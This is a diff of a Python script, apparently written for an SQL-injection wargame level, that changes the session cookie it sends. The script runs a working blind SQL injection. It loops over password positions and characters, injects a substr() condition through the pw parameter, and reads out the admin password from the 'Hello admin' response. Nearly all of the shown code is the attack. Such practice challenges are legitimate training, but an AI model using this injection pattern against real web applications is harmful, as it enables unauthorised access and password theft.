@@ -15,7 +15,7 @@ MyHeader = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/
 'Accept-Encoding': 'none',
 'Accept-Language': 'en-US,en;q=0.8',
 'Connection': 'keep-alive'}
-MyCookies = {'PHPSESSID': '68jotprn1p8enuiqjd12ahvgs7','_cfduid':'db874ed463a1dda475cbf0410b0e3f66c1494392708'}
+#MyCookies = {'PHPSESSID': '68jotprn1p8enuiqjd12ahvgs7','_cfduid':'db874ed463a1dda475cbf0410b0e3f66c1494392708'}
 length=8
 pw=""
 arr="1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
@@ -23,7 +23,7 @@ for i in range(1,9):
 	for j in range(0,62):
 		url="http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?pw=*'||id='admin'%26%26 substr(pw,{0},1)='{ascii}' %23".format(i,ascii=arr[j])
 		r = urllib.request.Request(url,headers=MyHeader)
-		r.add_header("Cookie","PHPSESSID=68jotprn1p8enuiqjd12ahvgs7")
+		r.add_header("Cookie","PHPSESSID=3lghblr5sl531is5c4lgc6cc01")
 		data = urllib.request.urlopen(r).read().decode("utf-8")
 		print(url)
 		if data.find("Hello admin") != -1 :
